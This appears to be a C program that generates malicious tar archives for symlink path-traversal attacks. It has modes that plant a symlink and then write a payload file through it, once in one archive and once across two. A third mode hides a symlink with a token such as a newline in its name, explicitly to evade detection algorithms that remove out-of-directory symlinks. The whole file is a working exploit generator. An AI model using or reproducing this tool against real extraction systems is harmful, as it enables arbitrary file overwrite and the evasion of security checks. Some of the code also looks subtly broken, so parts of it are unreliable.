#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <pwd.h>
#include <grp.h>

// POSIX tar archive
typedef struct {
    uint8_t file_name[100];
    uint8_t file_mode[8];
    uint8_t user_id[8];
    uint8_t group_id[8];
    uint8_t file_size[12];
    uint8_t modify_time[12];
    uint8_t header_checksum[8];
    uint8_t link_flag;
    uint8_t link_name[100];
    uint8_t magic[6];
    uint8_t version[2];
    uint8_t user_name[32];
    uint8_t group_name[32];
    uint8_t device_major[8];
    uint8_t device_minor[8];
    uint8_t padding[167];
} tar_header;

typedef enum {
    lf_oldnormal = 0x00,
    lf_normal = '0',
    lf_link,
    lf_symlink,
    lf_chr,
    lf_blk,
    lf_dir,
    lf_fifo,
    lf_contig
} link_flags;

void init_header(tar_header *header) {
    memset(header, 0x00, sizeof(tar_header));
    memset(header->header_checksum, ' ', 8);
    snprintf(header->magic, 6, "ustar");
    memset(header->version, ' ', 2);
}

void finish_header(tar_header *header) {
    int i; int checksum = 0;
    for (i = 0; i < 512; i++) {
        checksum += 0xFF & ((uint8_t *)header)[i];
    }
    snprintf(header->header_checksum, 8, "%07o", checksum);
}

void set_file_name(tar_header *header, char *name) {
    snprintf(header->file_name, 100, "%s", name);
}

void set_file_mode(tar_header *header, int mode) {
    snprintf(header->file_mode, 8, "%07o", mode);
}

void set_user_id(tar_header *header, int uid) {
    snprintf(header->user_id, 8, "%07o", uid);
}

void set_group_id(tar_header *header, int gid) {
    snprintf(header->group_id, 8, "%07o", gid);
}

void set_file_size(tar_header *header, int size) {
    snprintf(header->file_size, 12, "%011o", size);
}

//void set_modify_time(tar_header *header, long mtime) {
void set_modify_time(tar_header *header, struct timespec mtime) {
    snprintf(header->modify_time, 12, "%011o", mtime);
}

void set_link_flag(tar_header *header, link_flags flag) {
    header->link_flag = (uint8_t) flag;
}

void set_link_name(tar_header *header, char *name) {
    snprintf(header->link_name, 100, "%s", name);
}

void set_user_name(tar_header *header, char *user) {
    snprintf(header->user_name, 32, "%s", user);
}

void set_group_name(tar_header *header, char *group) {
    snprintf(header->group_name, 32, "%s", group);
}

void set_device_major(tar_header *header, int id) {
    snprintf(header->device_major, 8, "%07o", id);
}

void set_device_minor(tar_header *header, int id) {
    snprintf(header->device_minor, 8, "%07o", id);
}

void dump_header(tar_header *header) {
    printf("Filename:        '%s'\n", header->file_name);
    printf("Filemode:        '%s'\n", header->file_mode);
    printf("User ID:         '%s'\n", header->user_id);
    printf("Group ID:        '%s'\n", header->group_id);
    printf("File size:       '%s'\n", header->file_size);
    printf("Modify time:     '%s'\n", header->modify_time);
    printf("Header checksum: '%s'\n", header->header_checksum);
    printf("Link flag:       '");
    switch (header->link_flag) {
    case lf_oldnormal:
        printf("normal disk file, Unix compatible");
        break;
    case lf_normal:
        printf("normal disk file");
        break;
    case lf_link:
        printf("link to previous file");
        break;
    case lf_symlink:
        printf("symbolic link");
        break;
    case lf_chr:
        printf("character special file");
        break;
    case lf_blk:
        printf("block special file");
        break;
    case lf_dir:
        printf("directory");
        break;
    case lf_fifo:
        printf("FIFO special file");
        break;
    case lf_contig:
        printf("contiguous file");
        break;
    default:
        printf("invalid");
        break;
    }
    puts("'");
    printf("Link name:       '%s'\n", header->link_name);
    printf("Magic:           '%s'\n", header->magic);
    printf("User name:       '%s'\n", header->user_name);
    printf("Group name:      '%s'\n", header->group_name);
    printf("Major device ID: '%s'\n", header->device_major);
    printf("Minor device ID: '%s'\n", header->device_minor);
}

void write_header(tar_header *header, FILE *fp) {
    fwrite(header, sizeof(tar_header), 1, fp);
}

void write_body(FILE *fp_in, FILE *fp_out, long size) {
    uint8_t chunk[512];
    size_t read;
    size_t padding;
    size_t chunk_size;
    do {
        chunk_size = size;
        if (size > 512) {
            size -= 512;
            chunk_size = 512;
        }
        printf("Chunk_size %d\n", chunk_size);
        read = fread(chunk, 1, chunk_size, fp_in);
        printf("Read %d\n", read);
        fwrite(chunk, 1, read, fp_out);
        padding = 512 - read;
    } while (read > 512);
    printf("Padding: %d\n", padding);
    memset(chunk, 0x00, 512);
    fwrite(chunk, 1, padding, fp_out);
}

void add_symlink(char *stat_file, char *tar_filename, char *link_destination, FILE *fp_out) {
    struct stat statbuf;
    struct passwd *pwd;
    struct group *grp;
    tar_header header;
    init_header(&header);
    
    if (stat(stat_file, &statbuf)) {
        printf("Failed to stat %s\n", stat_file);
        return;
    }
    set_file_name(&header, tar_filename);
    //set_file_mode(&header, statbuf.st_mode);
    set_user_id(&header, statbuf.st_uid);
    set_group_id(&header, statbuf.st_gid);
    set_modify_time(&header, statbuf.st_mtim);
    
    set_link_flag(&header, lf_symlink);
    set_link_name(&header, link_destination);
    
    pwd = getpwuid(statbuf.st_uid);
    set_user_name(&header, pwd->pw_name);
    grp = getgrgid(statbuf.st_gid);
    set_group_name(&header, grp->gr_name);
    
    finish_header(&header);
    dump_header(&header);
    write_header(&header, fp_out);
}

void add_file(char *source, char *tar_filename, FILE *fp_out) {
    FILE *fp_in;
    long file_size;
    struct stat statbuf;
    struct passwd *pwd;
    struct group *grp;
    tar_header header;
    init_header(&header);
    if (stat(source, &statbuf)) {
        printf("Failed to stat %s\n", source);
        return;
    }
    fp_in = fopen(source, "rb");
    if (!fp_in) {
        printf("Failed to open %s\n", source);
        return;
    }
    set_file_name(&header, tar_filename);
    set_file_mode(&header, statbuf.st_mode);
    set_user_id(&header, statbuf.st_uid);
    set_group_id(&header, statbuf.st_gid);
    set_modify_time(&header, statbuf.st_mtim);
    set_link_flag(&header, lf_normal);
    pwd = getpwuid(statbuf.st_uid);
    set_user_name(&header, pwd->pw_name);
    grp = getgrgid(statbuf.st_gid);
    set_group_name(&header, grp->gr_name);
    fseek(fp_in, 0, SEEK_END);
    file_size = ftell(fp_in);
    rewind(fp_in);
    set_file_size(&header, file_size);
    finish_header(&header);
    dump_header(&header);
    write_header(&header, fp_out);
    write_body(fp_in, fp_out, file_size);
}

/*
 * Extract payload to destination of symlink in one file
 */
void scenario_symlink_dir_one(char *payload, char *linkname, char *destination, char *output) {
    char linkpath[100];
    FILE *fp_out = fopen(output, "wb");
    add_symlink(payload, linkname, destination, fp_out);
    snprintf(linkpath, 100, "%s/%s", linkname, payload);
    add_file(payload, linkpath, fp_out);
    fclose(fp_out);
    printf("Created %s\n", output);
}

/*
 * Extract payload to destination of symlink in two stages
 */
void scenario_symlink_dir_two(char *payload, char *linkname, char *destination, char *output1, char *output2) {
    char linkpath[100];
    FILE *fp_out = fopen(output1, "wb");
    add_symlink(payload, linkname, destination, fp_out);
    fclose(fp_out);
    fp_out = fopen(output2, "wb");
    snprintf(linkpath, 100, "%s/%s", linkname, payload);
    add_file(payload, linkpath, fp_out);
    printf("Created %s and %s\n", output1, output2);
}

/*
 * Used in a situation where extracted files are checked and symlinks outside of current directory are removed.
 * Create a symlink with a token in filename that breaks the detection algorithm (e.g. \n when reading tar output from shell)
 * Create another symlink to "hidden" symlink with accessible filename
 */
void scenario_symlink_hidden(char *stat_file, char *linkname, char *destination, char *output, char *token) {
    char link_hidden[100];
    FILE *fp_out = fopen(output, "wb");
    snprintf(link_hidden, 100, "%s%s", linkname, token);
    add_symlink(stat_file, link_hidden, destination, fp_out);
    add_symlink(stat_file, linkname, link_hidden, fp_out);
    fclose(fp_out);
    printf("Created %s\n", output);
}

void print_help(char *file_name) {
    printf("%s <scenario> [parameters]\n", file_name);
    puts("Scenarios:");
    puts("symlink_dir_one <payload> <linkname> <destination> <output>");
    puts("symlink_dir_two <payload> <linkname> <destination> <output1> <output1>");
    puts("symlink_hidden <stat_file> <linkname> <destination> <output> <token>");
    puts("\tstat_file is used for uid/gid and mtime of symlinks");
    puts("\ttoken is used to stop detection algorithms from finding symlink, e.g. use '\\n' ");
}

int main(int argc, char **argv) {
    if (argc < 2) {
        print_help(argv[0]);
        exit(0);
    }
    if (!strcmp(argv[1], "symlink_dir_one") && argc == 6) {
        scenario_symlink_dir_one(argv[2], argv[3], argv[4], argv[5]);
    } else if (!strcmp(argv[1], "symlink_dir_two") && argc == 7) {
        scenario_symlink_dir_two(argv[2], argv[3], argv[4], argv[5], argv[6]);
    } else if (!strcmp(argv[1], "symlink_hidden") && argc == 7) {
        scenario_symlink_hidden(argv[2], argv[3], argv[4], argv[5], argv[6]);
    } else {
        print_help(argv[0]);
        exit(0);        
    }
}
